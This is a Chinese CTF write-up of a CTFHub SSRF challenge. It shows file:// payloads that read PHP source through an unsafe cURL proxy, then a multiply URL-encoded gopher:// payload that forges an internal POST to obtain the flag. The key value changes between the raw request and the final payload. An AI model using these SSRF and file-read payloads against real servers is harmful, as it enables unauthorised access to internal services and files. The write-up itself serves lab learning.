### gopher 协议伪造 HTTP 请求

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f193f58cb8da5c8caf5e1.png)

老样子直接访问 `127.0.0.1/flag.php`，回显一个输入框

![](https://pic1.imgdb.cn/item/687f19ad58cb8da5c8caf5ea.png)

查看源码拿到一个 Key 值

![](https://pic1.imgdb.cn/item/687f1a1058cb8da5c8caf5f3.png)

输入后回车，提示仅限 `127.0.0.1` 查看

![](https://pic1.imgdb.cn/item/687f1c3058cb8da5c8caf6aa.png)

我们尝试用 file:// 读取文件,得到如下代码：

```http
?url=file:///var/www/html/index.php
```

```php
<?php
 
error_reporting(0);
 
if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

// 初始化 cURL，这是 PHP 提供的一个发起 HTTP 请求的库，底层可以发起 HTTP、HTTPS、FTP、gopher 等协议的请求
$ch = curl_init();

// 将用户传入的 url 参数直接传给 cURL 请求目标
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);

// CURLOPT_HEADER: 0 不返回响应头
curl_setopt($ch, CURLOPT_HEADER, 0);

// CURLOPT_FOLLOWLOCATION, 1: 如果目标返回 3xx 跳转，cURL 会自动跟随跳转
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

// 执行请求
curl_exec($ch);

// 关闭连接，释放资源
curl_close($ch);
```

再读取 `flag.php` 的

```http
?url=file:///var/www/html/flag.php
```

```php
<?php
 
// 关闭所有错误报告，防止泄露敏感信息
error_reporting(0);
 
// 判断请求来源 IP 是否为本地地址 127.0.0.1
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    // 如果不是本地访问，直接提示并终止脚本
    echo "Just View From 127.0.0.1";
    return;
}
 
// 从环境变量中获取 flag（一般在靶场环境中设置）
$flag = getenv("CTFHUB");

// 对 flag 做 MD5 哈希，得到 key
$key = md5($flag);
 
// 判断用户是否通过 POST 提交了 "key"，并且值与服务器计算的 $key 相同
if (isset($_POST["key"]) && $_POST["key"] == $key) {
    // 如果提交正确，返回 flag
    echo $flag;  // 当 post 传值为 key 时出 flag
    exit;
}
?>
 
<!-- 简单的 HTML 表单，允许用户提交 key -->
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug 信息：将服务器端计算的 key 显示在页面上（方便开发者调试，正常应删除） -->
<!-- Debug: key=<?php echo $key;?>-->
</form>

```

我们知道只要往 `flag.php` 传 key 值就可以得到 flag

而 `index.php` 可以利用 curl 传 url

那么我们可以用 gopher 协议在 `index.php` 中构造 POST 请求包往 `flag.php` 传 Key 值，以此获取 flag

所以我们通过 gopher 协议构造一个请求，配合 SSRF 模拟成内网用户去访问提交数据

构造这样的一个请求

![](https://pic1.imgdb.cn/item/687f1dd558cb8da5c8caf6ff.png)

直接 curl 后接 gopher 协议就先 URL 编码一次

关键的换行符是 CRLF（\r\n），而不是 LF（\n）单独使用

因为 **gopher://** 协议是**模拟原始 TCP 字节流**，而 HTTP 的协议报文换行是 `\r\n`，不能只用 `\n`

先把换行 `\r\n` 写成 **百分号编码**（url encode）：

- `\r` => `%0D`
- `\n` => `%0A`

于是变成：

```http
POST%20/flag.php%20HTTP/1.1%0D%0A
Host:%20127.0.0.1:80%0D%0A
Content-Type:%20application/x-www-form-urlencoded%0D%0A
Content-Length:%2036%0D%0A
%0D%0A
key=a840f3c56810783306b3a75f861bd31a
```

我这里思路是先跳到内网的 `index.php` 中再传入 POST 请求

所以要 URL 编码两次（在向服务器发送请求时，首先浏览器会进行一次 URL解码，因为有两个 ?url，所以会解码两次，其次服务器收到请求后，在执行 `curl` 功能时，进行第三次 URL解码）

最终使用 **gopher 协议 + 端口伪造请求**：

```http
?url=gopher://127.0.0.1:80/_
# _ 表示之后开始是 原始 TCP payload
```

最终 payload：

```http
?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c
```

![](https://pic1.imgdb.cn/item/687f203d58cb8da5c8caf79f.png)